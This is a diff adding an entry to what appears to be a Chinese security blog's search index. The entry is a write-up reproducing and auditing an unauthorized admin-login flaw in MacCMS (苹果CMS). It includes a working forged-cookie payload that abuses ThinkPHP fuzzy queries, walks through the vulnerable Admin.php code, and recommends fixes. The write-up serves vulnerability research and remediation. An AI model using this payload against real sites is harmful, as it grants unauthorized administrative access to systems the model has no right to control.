@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>苹果CMS未授权登录审计复现</title>
+      <link href="2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/"/>
+      <url>2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>苹果CMS爱好者平台由多个资深站长自由组建的,是以影视系统,漫画系统,小说系统,写真系统,教育系统等内容系统为主的交流学习平台,平台开放后深受众多站长们的喜爱</p><p>后台登录校验不严格，导致未授权登录后台</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先直接访问</p><p><a href="http://www.mm.com/admin.php/admin/index/index.html">www.mm.com/admin.php/admin/index/index.html</a></p><p>根据thinkphp框架特性POC为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_id=think:[&quot;like&quot;,&quot;%&quot;]; admin_name=think:[&quot;like&quot;,&quot;%&quot;]; admin_check=think:true</span><br></pre></td></tr></table></figure><p>抓包，修改cookie中的内容</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/1.png"></p><p><a href="http://www.mm.com/admin.php/admin/index/welcome.html">http://www.mm.com/admin.php/admin/index/welcome.html</a></p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/2.png"></p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/3.png"></p><p>cookie设置一下全局变量，就不用每次抓包加cookie</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/4.png"></p><h1 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h1><p>漏洞所在文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\application\common\model\Admin.php</span><br></pre></td></tr></table></figure><p>漏洞文件代码：(只贴上相关代码)</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第149-151行当账号密码正确的时候，会将登录信息存储到cookie中</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/6.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第167-169行，接收Cookie中的三个变量的值</span><br><span class="line">第176-178行，将接收到的三个值存储到<span class="variable">$where</span>这个数组中</span><br><span class="line">第180行，将<span class="variable">$where</span>中的数据在数据库中进行查询，当查询到将可以登录，上面利用了cookie获取登录验证的，我们可以利用thinkphp的特性将cookie中的值设置为模糊查询的，这样就相当于利用了账号密码登录</span><br><span class="line">第181行，<span class="keyword">if</span>(empty(<span class="variable">$info</span>))判断查询数据中是否为空，不为空就继续执行代码</span><br><span class="line">第187行，因为我们传admin_check=think:<span class="literal">true</span>，所以 <span class="keyword">if</span>(<span class="variable">$login_check</span> != <span class="variable">$admin_check</span>)，肯定会不成立，最后登录成功</span><br></pre></td></tr></table></figure><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>1.可以将登录信息记录到session中，验证登录从session中判断，从而达到不能伪造的cookie登录的目的</p><p>比如</p><p><img src="/2021/01/19/%E8%8B%B9%E6%9E%9CCMS%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/7.png"></p><p>2.升级到最新版本</p><p><strong>本文仅作于漏洞研究，禁止用于非法用途</strong></p><p><strong>造成一切后果，与作者无关</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Apache Flink CVE-2020-17519/17518 漏洞复现</title>
       <link href="2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
       <url>2021/01/19/Apache-Flink-CVE-2020-17519-17518-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
